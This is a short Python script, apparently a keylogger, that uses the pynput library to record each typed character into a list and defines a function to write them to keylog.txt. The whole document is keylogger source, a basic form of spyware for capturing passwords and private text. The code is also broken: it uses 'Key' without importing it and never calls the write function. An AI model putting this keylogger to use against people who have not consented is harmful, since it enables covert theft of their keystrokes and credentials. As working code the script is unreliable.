```python
# Import necessary modules
from pynput.keyboard import Listener

# Set the output file path
output_file = "keylog.txt"

# Initialize the logger
keys = []

def on_press(key):
    try:
        # Write the pressed key to the log list
        keys.append(key.char)
    except AttributeError:
        # Handle special keys (e.g., Shift, Ctrl, etc.)
        pass

def write_file(keys):
    with open(output_file, "w") as f:
        for key in keys:
            # Remove single quotes and add a space after each keystroke
            k = str(key).replace("'", "")
            f.write(k + " ")

def on_release(key):
    if key == Key.esc:
        # Stop the listener
        return False

# Create a listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```
